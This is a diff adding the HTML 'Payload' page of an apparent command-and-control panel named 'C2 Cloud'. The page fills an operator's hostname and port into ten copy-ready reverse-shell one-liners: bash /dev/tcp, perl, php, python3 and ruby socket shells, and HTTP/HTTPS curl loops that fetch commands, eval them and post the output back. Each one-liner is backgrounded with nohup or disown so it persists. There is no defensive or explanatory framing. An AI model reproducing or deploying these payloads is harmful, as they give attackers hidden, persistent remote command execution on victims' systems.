@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>C2 Cloud</title>
+
+    <!--====== CSS ======-->
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/LineIcons.css">
+    <link rel="stylesheet" href="assets/css/magnific-popup.css">
+    <link rel="stylesheet" href="assets/css/slick.css">
+    <link rel="stylesheet" href="assets/css/animate.css">
+    <link rel="stylesheet" href="assets/css/default.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="css/c2_common.css">
+    <link rel="stylesheet" href="css/c2_payload.css">
+
+    <!--====== JS ======-->
+    <script type="text/javascript" src="js/jquery-3.3.1.js"></script>
+    <script type="text/javascript" src="js/c2_payload.js"></script>
+
+</head>
+
+<body>
+
+    <section class="header-area">
+        <div id="navarea" class="navbar-area">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <nav class="navbar navbar-expand-lg">
+                            <a class="navbar-brand" href="/">
+                                <img src="img/c2_cloud_logo.png" alt="Logo">
+                            </a>
+
+                            <button class="navbar-toggler" type="button" data-toggle="collapse"
+                                data-target="#navbarEight" aria-controls="navbarEight" aria-expanded="false"
+                                aria-label="Toggle navigation">
+                                <span class="toggler-icon"></span>
+                                <span class="toggler-icon"></span>
+                                <span class="toggler-icon"></span>
+                            </button>
+
+                            <div class="collapse navbar-collapse sub-menu-bar" id="navbarEight">
+                                <ul class="navbar-nav ml-auto">
+                                    <li class="nav-item">
+                                        <a href="/">HOME</a>
+                                    </li>
+                                    <li class="nav-item active">
+                                        <a href="/payload">Payload</a>
+                                    </li>
+                                </ul>
+                            </div>
+
+                        </nav> <!-- navbar -->
+                    </div>
+                </div> <!-- row -->
+            </div> <!-- container -->
+        </div> <!-- navbar area -->
+
+    </section>
+
+    <div class="payload">
+        <div class="input-container">
+            <div class="input-group">
+                <label for="hostname">Hostname:</label>
+                <input type="text" id="hostname" name="hostname" placeholder="Enter hostname...">
+            </div>
+            <div class="input-group">
+                <label for="port">Port:</label>
+                <input type="number" id="port" name="port" placeholder="Enter port...">
+            </div>
+            <div class="input-group">
+                <button type="button" id="submitBtn">Submit</button>
+            </div>
+        </div>
+            
+            <div class="results-container">
+            <div class="row-container">
+                <div class="type-item">
+                <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                <span id="payload_text_0" class="payload_text result-text">nohup `exec 5<>/dev/tcp/{host_name}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done` &</span>
+                <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_0" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_1" class="payload_text result-text">perl -e 'use Socket;$i="{host_name}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_1" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_2" class="payload_text result-text">nohup php -r '$sock=fsockopen("{host_name}",{port});passthru("bash <&3 >&3 2>&3");' 3<>/dev/tcp/{host_name}/{port} > /dev/null 2>&1 & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_2" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_3" class="payload_text result-text">nohup php -r '$sock=fsockopen("{host_name}",{port});popen("bash <&3 >&3 2>&3", "r");' 3<>/dev/tcp/{host_name}/{port} > /dev/null 2>&1 & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_3" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_4" class="payload_text result-text">export hname="{host_name}"; export portno={port}; nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("hname"),int(os.getenv("portno"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' > /dev/null 2>&1 & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_4" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_5" class="payload_text result-text">nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host_name}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /dev/null 2>&1 & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_5" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_6" class="payload_text result-text">nohup ruby -rsocket -e'exit if fork;c=TCPSocket.new("{host_name}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}' > /dev/null 2>&1 & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_6" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">TCP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_7" class="payload_text result-text">nohup ruby -rsocket -e 'spawn("bash",[:in,:out,:err]=>TCPSocket.new("{host_name}",{port}))' > /dev/null 2>&1 & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_7" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">HTTP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_8" class="payload_text result-text">nohup bash -c 's={host_name}&&i={session_id}&&hname=$(hostname)&&p=http://;curl -s "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/$i" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r";echo $$;fi; fi; sleep 1; done;\' & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_8" src="/img/copy_32.png" alt="Copy">
+                    </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="type-item">
+                    <span class="type-text">HTTPS</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_9" class="payload_text result-text">nohup `s={host_name}&&i={session_id}&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/$i" -H "Authorization: $i" 2>/dev/null);if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r" 2>/dev/null; fi; fi; sleep 1; done;` &</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_9" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+            </div>
+    </div>
+    <!-- Create Modal -->
+    <div class="modal fade" id="createModal" tabindex="-1" role="dialog"
+        aria-labelledby="createModalLabel" aria-hidden="true" data-backdrop="static"
+        data-keyboard="false">
+        <div class="modal-dialog modal-sm" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h4 class="modal-title w-100" id="createModalLabel">COPY</h4>
+                </div>
+                <div class="modal-body">
+                    
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary btn-sm" id="create_ok">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!--====== JS ======-->
+    <script src="assets/js/vendor/modernizr-3.6.0.min.js"></script>
+    <script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    <script src="assets/js/popper.min.js"></script>
+    <script src="assets/js/slick.min.js"></script>
+    <script src="assets/js/isotope.pkgd.min.js"></script>
+    <script src="assets/js/imagesloaded.pkgd.min.js"></script>
+    <script src="assets/js/jquery.magnific-popup.min.js"></script>
+    <script src="assets/js/scrolling-nav.js"></script>
+    <script src="assets/js/jquery.easing.min.js"></script>
+    <script src="assets/js/wow.min.js"></script>
+    <script src="assets/js/main.js"></script>
+</body>
+
+</html>
